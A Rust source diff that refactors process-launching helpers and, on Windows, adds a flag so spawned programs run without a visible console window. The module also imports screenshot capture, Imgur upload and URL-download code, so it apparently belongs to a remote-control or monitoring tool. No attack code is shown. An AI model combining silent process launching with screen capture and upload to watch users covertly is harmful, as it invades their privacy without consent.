@@ -9,12 +9,17 @@ use std::io::Cursor;
 use std::process::Command;
 use std::thread;
 use std::time::Duration;
+#[cfg(target_os = "windows")]
+use std::os::windows::process::CommandExt;
 
 use imgurs::ImgurClient;
 use rand::prelude::*;
 use screenshots::Screen;
 use systemstat::{saturating_sub_bytes, Platform, System};
 use tracing::*;
+
+const CREATE_NO_WINDOW: u32 = 0x08000000;
+const DETACHED_PROCESS: u32 = 0x00000008;
 
 pub async fn download_string(url: &str) -> anyhow::Result<String> {
     Ok(reqwest::get(url).await?.text().await?)
@@ -57,10 +62,14 @@ pub fn run_process(exe: &str, args: Vec<&str>, wait: bool) -> anyhow::Result<()>
         full_command.push(arg);
     }
 
+    let mut command = Command::new(full_command[0]);
+    command.args(full_command[1..full_command.len()].to_vec());
+    #[cfg(target_os = "windows")]
+    command.creation_flags(CREATE_NO_WINDOW); 
     if wait {
-        Command::new(full_command[0]).args(full_command[1..full_command.len()].to_vec()).output()?;
+        command.output()?;
     } else {
-        Command::new(full_command[0]).args(full_command[1..full_command.len()].to_vec()).spawn()?;
+        command.spawn()?;
     }
 
     Ok(())
@@ -84,17 +93,16 @@ pub fn run_process_with_work_dir(
     for arg in args {
         full_command.push(arg);
     }
+    let mut command = Command::new(full_command[0]);
+    command.args(full_command[1..full_command.len()].to_vec());
+    command.current_dir(current_dir);
+    #[cfg(target_os = "windows")]
+    command.creation_flags(CREATE_NO_WINDOW); 
 
     if wait {
-        Command::new(full_command[0])
-            .args(full_command[1..full_command.len()].to_vec())
-            .current_dir(current_dir)
-            .output()?;
+        command.output()?;
     } else {
-        Command::new(full_command[0])
-            .args(full_command[1..full_command.len()].to_vec())
-            .current_dir(current_dir)
-            .spawn()?;
+        command.spawn()?;
     }
     Ok(())
 }
